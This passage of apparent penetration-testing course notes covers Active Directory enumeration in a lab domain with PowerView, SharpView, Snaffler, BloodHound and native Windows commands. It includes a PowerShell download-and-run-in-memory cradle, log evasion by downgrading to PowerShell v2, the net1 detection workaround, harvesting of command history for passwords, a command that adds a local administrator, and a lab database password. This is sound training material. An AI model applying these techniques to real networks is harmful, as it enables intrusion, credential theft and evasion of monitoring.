|`Get-DomainDFSShare`|Returns a list of all distributed file systems for the current (or specified) domain|
|**GPO Functions:**||
|`Get-DomainGPO`|Will return all GPOs or specific GPO objects in AD|
|`Get-DomainPolicy`|Returns the default domain policy or the domain controller policy for the current domain|
|**Computer Enumeration Functions:**||
|`Get-NetLocalGroup`|Enumerates local groups on the local or a remote machine|
|`Get-NetLocalGroupMember`|Enumerates members of a specific local group|
|`Get-NetShare`|Returns open shares on the local (or a remote) machine|
|`Get-NetSession`|Will return session information for the local (or a remote) machine|
|`Test-AdminAccess`|Tests if the current user has administrative access to the local (or a remote) machine|
|**Threaded 'Meta'-Functions:**||
|`Find-DomainUserLocation`|Finds machines where specific users are logged in|
|`Find-DomainShare`|Finds reachable shares on domain machines|
|`Find-InterestingDomainShareFile`|Searches for files matching specific criteria on readable shares in the domain|
|`Find-LocalAdminAccess`|Find machines on the local domain where the current user has local administrator access|
|**Domain Trust Functions:**||
|`Get-DomainTrust`|Returns domain trusts for the current domain or a specified domain|
|`Get-ForestTrust`|Returns all forest trusts for the current forest or a specified forest|
|`Get-DomainForeignUser`|Enumerates users who are in groups outside of the user's domain|
|`Get-DomainForeignGroupMember`|Enumerates groups with users outside of the group's domain and returns each foreign member|
|`Get-DomainTrustMapping`|Will enumerate all trusts for the current domain and any others seen.|

This table is not all-encompassing for what PowerView offers, but it includes many of the functions we will use repeatedly. For more on PowerView, check out the [Active Directory PowerView module](https://academy.hackthebox.com/course/preview/active-directory-powerview). Below we will experiment with a few of them.

First up is the [Get-DomainUser](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainUser/) function. This will provide us with information on all users or specific users we specify. Below we will use it to grab information about a specific user, `mmorgan`.

#### Domain User Information
![](../../ZMEDIA/Pasted%20image%2020260706234538.png)

We saw some basic user information with PowerView. Now let's enumerate some domain group information. We can use the [Get-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroupMember/) function to retrieve group-specific information. Adding the `-Recurse` switch tells PowerView that if it finds any groups that are part of the target group (nested group membership) to list out the members of those groups. For example, the output below shows that the `Secadmins` group is part of the `Domain Admins` group through nested group membership. In this case, we will be able to view all of the members of that group who inherit Domain Admin rights via their group membership.

#### Recursive Group Membership
![](../../ZMEDIA/Pasted%20image%2020260706234556.png)
Above we performed a recursive look at the `Domain Admins` group to list its members. Now we know who to target for potential elevation of privileges. Like with the AD PowerShell module, we can also enumerate domain trust mappings.

#### Trust Enumeration
![](../../ZMEDIA/Pasted%20image%2020260706234609.png)

We can use the [Test-AdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/) function to test for local admin access on either the current machine or a remote one.

#### Testing for Local Admin Access

```powershell
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01 
ComputerName    IsAdmin 
------------    ------- 
ACADEMY-EA-MS01    True
```

Above, we determined that the user we are currently using is an administrator on the host ACADEMY-EA-MS01. We can perform the same function for each host to see where we have administrative access. We will see later how well BloodHound performs this type of check. Now we can check for users with the SPN attribute set, which indicates that the account may be subjected to a Kerberoasting attack.

#### Finding Users With SPN Set

![](../../ZMEDIA/Pasted%20image%2020260706234647.png)
Test out some more of the tool's functions until you are comfortable using it. We will see PowerView quite a few more times as we progress through this module.

---

## SharpView

PowerView is part of the now deprecated PowerSploit offensive PowerShell toolkit. The tool has been receiving updates by BC-Security as part of their [Empire 4](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) framework. Empire 4 is BC-Security's fork of the original Empire project and is actively maintained as of April 2022. We show examples throughout this module using the development version of PowerView because it is an excellent tool for recon in an Active Directory environment, and is still extremely powerful and helpful in modern AD networks even though the original version is not maintained. The BC-SECURITY version of [PowerView](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1) has some new functions such as `Get-NetGmsa`, used to hunt for [Group Managed Service Accounts](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which is out of scope for this module. It is worth playing around with both versions to see the subtle differences between the old and currently maintained versions.

Another tool worth experimenting with is SharpView, a .NET port of PowerView. Many of the same functions supported by PowerView can be used with SharpView. We can type a method name with `-Help` to get an argument list.

![](../../ZMEDIA/Pasted%20image%2020260706234700.png)

Here we can use SharpView to enumerate information about a specific user, such as the user `forend`, which we control.

![](../../ZMEDIA/Pasted%20image%2020260706234718.png)
Experiment with SharpView on the MS01 host and recreate as many PowerView examples as possible. Though evasion is not in scope for this module, SharpView can be useful when a client has hardened against PowerShell usage or we need to avoid using PowerShell.

---

## Shares

Shares allow users on a domain to quickly access information relevant to their daily roles and share content with their organization. When set up correctly, domain shares will require a user to be domain joined and required to authenticate when accessing the system. Permissions will also be in place to ensure users can only access and see what is necessary for their daily role. Overly permissive shares can potentially cause accidental disclosure of sensitive information, especially those containing medical, legal, personnel, HR, data, etc. In an attack, gaining control over a standard domain user who can access shares such as the IT/infrastructure shares could lead to the disclosure of sensitive data such as configuration files or authentication files like SSH keys or passwords stored insecurely. We want to identify any issues like these to ensure the customer is not exposing any data to users who do not need to access it for their daily jobs and that they are meeting any legal/regulatory requirements they are subject to (HIPAA, PCI, etc.). We can use PowerView to hunt for shares and then help us dig through them or use various manual commands to hunt for common strings such as files with `pass` in the name. This can be a tedious process, and we may miss things, especially in large environments. Now, let's take some time to explore the tool `Snaffler` and see how it can aid us in identifying these issues more accurately and efficiently.

---

## Snaffler

[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.

To execute Snaffler, we can use the command below:

#### Snaffler Execution

```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

The `-s` tells it to print results to the console for us, the `-d` specifies the domain to search within, and the `-o` tells Snaffler to write results to a logfile. The `-v` option is the verbosity level. Typically `data` is best as it only displays results to the screen, so it's easier to begin looking through the tool runs. Snaffler can produce a considerable amount of data, so we should typically output to file and let it run and then come back to it later. It can also be helpful to provide Snaffler raw output to clients as supplemental data during a penetration test as it can help them zero in on high-value shares that should be locked down first.

#### Snaffler in Action

![](../../ZMEDIA/Pasted%20image%2020260706234801.png)

We may find passwords, SSH keys, configuration files, or other data that can be used to further our access. Snaffler color codes the output for us and provides us with a rundown of the file types found in the shares.

Now that we have a wealth of data about the INLANEFREIGHT.LOCAL domain (and hopefully clear notes and log file output!), we need a way to correlate it and visualize it. Let's dive deeper into `BloodHound` and see how powerful this tool can be during any AD-focused security assessment.

---

### BloodHound

As discussed in the previous section, `Bloodhound` is an exceptional open-source tool that can identify attack paths within an AD environment by analyzing the relationships between objects. Both penetration testers and blue teamers can benefit from learning to use BloodHound to visualize relationships in the domain. When used correctly and coupled with custom Cipher queries, BloodHound may find high-impact, but difficult to discover, flaws that have been present in the domain for years.

First, we must authenticate as a domain user from a Windows attack host positioned within the network (but not joined to the domain) or transfer the tool to a domain-joined host. There are many ways to achieve this covered in the [File Transfer](https://academy.hackthebox.com/course/preview/file-transfers) module. For our purposes, we will work with SharpHound.exe already on the attack host, but it's worth experimenting with transferring the tool to the attack host from Pwnbox or our own VM using methods such as a Python HTTP server, smbserver.py from Impacket, etc.

If we run SharpHound with the `--help` option, we can see the options available to us.

#### SharpHound in Action
![](../../ZMEDIA/Pasted%20image%2020260706234820.png)

We'll start by running the SharpHound.exe collector from the MS01 attack host.
![](../../ZMEDIA/Pasted%20image%2020260706234837.png)

Next, we can exfiltrate the dataset to our own VM or ingest it into the BloodHound GUI tool on MS01. We can do this on MS01 by typing `bloodhound` into a CMD or PowerShell console. The credentials should be saved, but enter `neo4j: HTB_@cademy_stdnt!` if a prompt appears. Next, click on the `Upload Data` button on the right-hand side, select the newly generated zip file, and click `Open`. An `Upload Progress` window will pop up. Once all .json files show 100% complete, click the X at the top of that window.

We can start by typing `domain:` in the search bar on the top left and choosing `INLANEFREIGHT.LOCAL` from the results. Take a moment to browse the node info tab. As we can see, this would be a rather large company with over 550 hosts to target and trusts with two other domains.

Now, let's check out a few pre-built queries in the `Analysis` tab. The query `Find Computers with Unsupported Operating Systems` is great for finding outdated and unsupported operating systems running legacy software. These systems are relatively common to find within enterprise networks (especially older environments), as they often run some product that cannot be updated or replaced as of yet. Keeping these hosts around may save money, but they also can add unnecessary vulnerabilities to the network. Older hosts may be susceptible to older remote code execution vulnerabilities like [MS08-067](https://support.microsoft.com/en-us/topic/ms08-067-vulnerability-in-server-service-could-allow-remote-code-execution-ac7878fc-be69-7143-472d-2507a179cd15). If we come across these older hosts during an assessment, we should be careful before attacking them (or even check with our client) as they may be fragile and running a critical application or service. We can advise our client to segment these hosts off from the rest of the network as much as possible if they cannot remove them yet, but should also recommend that they start putting together a plan to decommission and replace them.

This query shows two hosts, one running Windows 7 and one running Windows Server 2008 (both of which are not "live" in our lab). Sometimes we will see hosts that are no longer powered on but still appear as records in AD. We should always validate whether they are "live" or not before making recommendations in our reports. We may write up a high-risk finding for Legacy Operating Systems or a best practice recommendation for cleaning up old records in AD.

#### Unsupported Operating Systems

![BloodHound interface showing node info for ACADEMY-EA-WS01.INLANEFREIGHT.LOCAL with details like sessions, reachable targets, and node properties.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/unsupported.png)

We will often see users with local admin rights on their host (perhaps temporarily to install a piece of software, and the rights were never removed), or they occupy a high enough role in the organization to demand these rights (whether they require them or not). Other times we'll see excessive local admin rights handed out across the organization, such as multiple groups in the IT department with local admin over groups of servers or even the entire Domain Users group with local admin over one or more hosts. This can benefit us if we take over a user account with these rights over one or more machines. We can run the query `Find Computers where Domain Users are Local Admin` to quickly see if there are any hosts where all users have local admin rights. If this is the case, then any account we control can typically be used to access the host(s) in question, and we may be able to retrieve credentials from memory or find other sensitive data.

#### Local Admins

![BloodHound interface showing node info for DOMAIN USERS@INLANEFREIGHT.LOCAL with sessions, node properties, and connection to ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/local-admin.png)

This is just a snapshot of the useful queries we can run. As we continue through this module, you will see several more that can be helpful in finding other weaknesses in the domain. For a more in-depth study on BloodHound, check out the module [Active Directory Bloodhound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound). Take some time and try out each of the queries in the `Analysis` tab to become more familiar with the tool. It's also worth experimenting with [custom Cypher queries](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/) by pasting them into the `Raw Query` box at the bottom of the screen.

Keep in mind as we go through the engagement, we should be documenting every file that is transferred to and from hosts in the domain and where they were placed on disk. This is good practice if we have to deconflict our actions with the customer. Also, depending on the scope of the engagement, you want to ensure you cover your tracks and clean up anything you put in the environment at the conclusion of the engagement.

---

We have a great picture of the domain's layout, strengths, and weaknesses. We have credentials for several users and have enumerated a wealth of information such as users, groups, computers, GPOs, ACLs, local admin rights, access rights (RDP, WinRM, etc.), accounts configured with Service Principal Names (SPNs), and more. We have detailed notes and a wealth of output and experimented with many different tools to practice enumerating AD with and without credentials from Linux and Windows attack hosts. What happens if we are restricted with the shell we have or do not have the ability to import tools? Our client may ask us to perform all work from a managed host inside their network without internet access and no way to load our tools. We could land on a host as `SYSTEM` after a successful attack, but be in a position where it is very difficult or not possible to load tools. What do we do then? In the next section, we will look at how to perform actions while "Living Off The Land."


# Living Off the Land

---

Earlier in the module, we practiced several tools and techniques (both credentialed and uncredentialed) to enumerate the AD environment. These methods required us to upload or pull the tool onto the foothold host or have an attack host inside the environment. This section will discuss several techniques for utilizing native Windows tools to perform our enumeration and then practice them from our Windows attack host.

---

## Scenario

Let's assume our client has asked us to test their AD environment from a managed host with no internet access, and all efforts to load tools onto it have failed. Our client wants to see what types of enumeration are possible, so we'll have to resort to "living off the land" or only using tools and commands native to Windows/Active Directory. This can also be a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network in previous sections. Most enterprise environments nowadays have some form of network monitoring and logging, including IDS/IPS, firewalls, and passive sensors and tools on top of their host-based defenses such as Windows Defender or enterprise EDR. Depending on the environment, they may also have tools that take a baseline of "normal" network traffic and look for anomalies. Because of this, our chances of getting caught go up exponentially when we start pulling tools into the environment from outside.

---

## Env Commands For Host & Network Recon

First, we'll cover a few basic environmental commands that can be used to give us more information about the host we are on.

#### Basic Enumeration Commands

|**Command**|**Result**|
|---|---|
|`hostname`|Prints the PC's Name|
|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|
|`ipconfig /all`|Prints out network adapter state and configurations|
|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|

#### Basic Enumeration

![GIF showcasing the commands in a PowerShell terminal from the table above.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/basic-enum.png)

The commands above will give us a quick initial picture of the state the host is in, as well as some basic networking and domain information. We can cover the information above with one command [systeminfo](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo).

#### Systeminfo

![GIF showcasing the systeminfo command in a PowerShell terminal.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/systeminfo.png)

The `systeminfo` command, as seen above, will print a summary of the host's information for us in one tidy output. Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender.

---

## Harnessing PowerShell

PowerShell has been around since 2006 and provides Windows sysadmins with an extensive framework for administering all facets of Windows systems and AD environments. It is a powerful scripting language and can be used to dig deep into systems. PowerShell has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.

Let's look at a few of the ways PowerShell can help us.

|**Cmd-Let**|**Description**|
|---|---|
|`Get-Module`|Lists available modules loaded for use.|
|`Get-ExecutionPolicy -List`|Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.|
|`Set-ExecutionPolicy Bypass -Scope Process`|This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.|
|`Get-ChildItem Env: \| ft Key,Value`|Return environment values such as key paths, users, computer information, etc.|
|`Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`|With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.|
|`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`|This is a quick and easy way to download a file from the web using PowerShell and call it from memory.|

Let's see them in action now on the `MS01` host.

#### Quick Checks Using PowerShell
![](../../ZMEDIA/Pasted%20image%2020260706235102.png)`

We have performed basic enumeration of the host. Now, let's discuss a few operational security tactics.

Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.

#### Downgrade Powershell
![](../../ZMEDIA/Pasted%20image%2020260706235125.png)
We can now see that we are running an older version of PowerShell from the output above. Notice the difference in the version reported. It validates we have successfully downgraded the shell. Let's check and see if we are still writing logs. The primary place to look is in the `PowerShell Operational Log` found under `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`. All commands executed in our session will log to this file. The `Windows PowerShell` log located at `Applications and Services Logs > Windows PowerShell` is also a good place to check. An entry will be made here when we start an instance of PowerShell. In the image below, we can see the red entries made to the log from the current PowerShell session and the output of the last entry made at 2:12 pm when the downgrade is performed. It was the last entry since our session moved into a version of PowerShell no longer capable of logging. Notice that, that event corresponds with the last event in the `Windows PowerShell` log entries.

#### Examining the Powershell Event Log

![Event Viewer showing PowerShell operational logs with Event 4104 details, including script block creation and execution time.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/downgrade.png)

With [Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2) enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0. Notice above in the logs that we can see the commands we issued during a normal shell session, but it stopped after starting a new PowerShell instance in version 2. Be aware that the action of issuing the command `powershell.exe -version 2` within the PowerShell session will be logged. So evidence will be left behind showing that the downgrade happened, and a suspicious or vigilant defender may start an investigation after seeing this happen and the logs no longer filling up for that instance. We can see an example of this in the image below. Items in the red box are the log entries before starting the new instance, and the info in green is the text showing a new PowerShell session was started in HostVersion 2.0.

#### Starting V2 Logs

![Event Viewer showing Windows PowerShell logs with Event 400 details, including ConsoleHost information and execution time.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/start-event.png)

---

### Checking Defenses

The next few commands utilize the [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) and [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.

#### Firewall Checks

![](../../ZMEDIA/Pasted%20image%2020260706235150.png)

#### Windows Defender Check (from CMD.exe)
![](../../ZMEDIA/Pasted%20image%2020260706235206.png)

Above, we checked if Defender was running. Below we will check the status and configuration settings with the [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps) cmdlet in PowerShell.

#### Get-MpComputerStatus
![](../../ZMEDIA/Pasted%20image%2020260706235222.png)

Knowing what revision our AV settings are at and what settings are enabled/disabled can greatly benefit us. We can tell how often scans are run, if the on-demand threat alerting is active, and more. This is also great info for reporting. Often defenders may think that certain settings are enabled or scans are scheduled to run at certain intervals. If that's not the case, these findings can help them remediate those issues.

---

## Am I Alone?

When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.

#### Using qwinsta
![](../../ZMEDIA/Pasted%20image%2020260706235240.png)

Now that we have a solid feel for the state of our host, we can enumerate the network settings for our host and identify any potential domain machines or services we may want to target next.

## Network Information

|**Networking Commands**|**Description**|
|---|---|
|`arp -a`|Lists all known hosts stored in the arp table.|
|`ipconfig /all`|Prints out adapter settings for the host. We can figure out the network segment from here.|
|`route print`|Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.|
|`netsh advfirewall show allprofiles`|Displays the status of the host's firewall. We can determine if it is active and filtering traffic.|

Commands such as `ipconfig /all` and `systeminfo` show us some basic networking configurations. Two more important commands provide us with a ton of valuable data and could help us further our access. `arp -a` and `route print` will show us what hosts the box we are on is aware of and what networks are known to the host. Any networks that appear in the routing table are potential avenues for lateral movement because they are accessed enough that a route was added, or it has administratively been set there so that the host knows how to access resources on the domain. These two commands can be especially helpful in the discovery phase of a black box assessment where we have to limit our scanning

#### Using arp -a
![](../../ZMEDIA/Pasted%20image%2020260706235255.png)

#### Viewing the Routing Table

 ![](../../ZMEDIA/Pasted%20image%2020260706235324.png)
Using `arp -a` and `route print` will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.

---

## Windows Management Instrumentation (WMI)

[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.

#### Quick WMI checks

|**Command**|**Description**|
|---|---|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patch level and description of the Hotfixes applied|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays basic host information to include any attributes within the list|
|`wmic process list /format:list`|A listing of all processes on host|
|`wmic ntdomain list /format:list`|Displays information about the Domain and Domain Controllers|
|`wmic useraccount list /format:list`|Displays information about all local accounts and any domain accounts that have logged into the device|
|`wmic group list /format:list`|Information about all local groups|
|`wmic sysaccount list /format:list`|Dumps information about any system accounts that are being used as service accounts.|

Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.
![](../../ZMEDIA/Pasted%20image%2020260706235340.png)

WMI is a vast topic, and it would be impossible to touch on everything it is capable of in one part of a section. For more information about WMI and its capabilities, check out the official [WMI documentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/using-wmi).

---

## Net Commands

[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:

- Local and domain users
- Groups
- Hosts
- Specific users in groups
- Domain Controllers
- Password requirements

We'll cover a few examples below. Keep in mind that `net.exe` commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as `whoami`, and `net localgroup administrators`, etc. This could be an obvious red flag to anyone monitoring the network heavily.

#### Table of Useful Net Commands

|**Command**|**Description**|
|---|---|
|`net accounts`|Information about password requirements|
|`net accounts /domain`|Password and lockout policy|
|`net group /domain`|Information about domain groups|
|`net group "Domain Admins" /domain`|List users with domain admin privileges|
|`net group "domain computers" /domain`|List of PCs connected to the domain|
|`net group "Domain Controllers" /domain`|List PC accounts of domains controllers|
|`net group <domain_group_name> /domain`|User that belongs to the group|
|`net groups /domain`|List of domain groups|
|`net localgroup`|All available groups|
|`net localgroup administrators /domain`|List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default)|
|`net localgroup Administrators`|Information about a group (admins)|
|`net localgroup administrators [username] /add`|Add user to administrators|
|`net share`|Check current shares|
|`net user <ACCOUNT_NAME> /domain`|Get information about a user within the domain|
|`net user /domain`|List all users of the domain|
|`net user %username%`|Information about the current user|
|`net use x: \computer\share`|Mount the share locally|
|`net view`|Get a list of computers|
|`net view /all /domain[:domainname]`|Shares on the domains|
|`net view \computer /ALL`|List shares of a computer|
|`net view /domain`|List of PCs of the domain|

#### Listing Domain Groups
![](../../ZMEDIA/Pasted%20image%2020260706235358.png)

We can see above the `net group` command provided us with a list of groups within the domain.

#### Information about a Domain User
![](../../ZMEDIA/Pasted%20image%2020260706235432.png)
#### Net Commands Trick

If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

#### Running Net1 Command

![GIF showcasing the net1 command in a PowerShell terminal.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/net1userreal.png)

---

## Dsquery

[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\(v=ws.11\)) is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, `dsquery` will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.

#### Dsquery DLL

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context. Below, we will show the basic search function with `dsquery` and a few helpful search filters.

#### User Search
![](../../ZMEDIA/Pasted%20image%2020260706235457.png)

#### Computer Search
![](../../ZMEDIA/Pasted%20image%2020260706235517.png)

We can use a [dsquery wildcard search](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232\(v=ws.11\)) to view all objects in an OU, for example.

#### Wildcard Search

![](../../ZMEDIA/Pasted%20image%2020260706235537.png)

We can, of course, combine `dsquery` with LDAP search filters of our choosing. The below looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.

#### Users With Specific Attributes Set (PASSWD_NOTREQD)

![](../../ZMEDIA/Pasted%20image%2020260706235553.png)

The below search filter looks for all Domain Controllers in the current domain, limiting to five results.

#### Searching for Domain Controllers
![](../../ZMEDIA/Pasted%20image%2020260706235608.png)

### LDAP Filtering Explained

You will notice in the queries above that we are using strings such as `userAccountControl:1.2.840.113556.1.4.803:=8192`. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:

`userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as [Object Identifiers (OIDs)](https://ldap.com/ldap-oid-reference-guide/).  
`=8192` represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like `password is not required` or `account is locked` is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.

#### UAC Values

![Diagram of User Account Control Bit Values showing bit positions for various account settings like 'Login Script Will Execute' and 'Account Is Disabled'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/143/UAC-values.png)

#### OID match strings

OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

1. `1.2.840.113556.1.4.803`

When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

2. `1.2.840.113556.1.4.804`

When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

3. `1.2.840.113556.1.4.1941`

This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

#### Logical Operators

When building out search strings, we can utilize logical operators to combine values for the search. The operators `&` `|` and `!` are used for this purpose. For example we can combine multiple [search criteria](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) with the `& (and)` operator like so:  
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like `(&(1) (2) (3))`. The `!` (not) and `|` (or) operators can work similarly. For example, our filter above can be modified as follows:  
`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`

This would search for any user object that does `NOT` have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.

A lot can be done with UAC filters, operators, and attribute matching with OID rules. For now, this general explanation should be sufficient to cover this module. For more information and a deeper dive into using this type of filter searching, see the [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap) module.

---

We have now used our foothold to perform credentialed enumeration with tools on Linux and Windows attack hosts and using built-in tools and validated host and domain information. We have proven that we can access internal hosts, password spraying, and LLMNR/NBT-NS poisoning works and that we can utilize tools that already reside on the hosts to perform our actions. Now we will take it a step further and tackle a TTP every AD pentester should have in their toolbelt, `Kerberoasting`.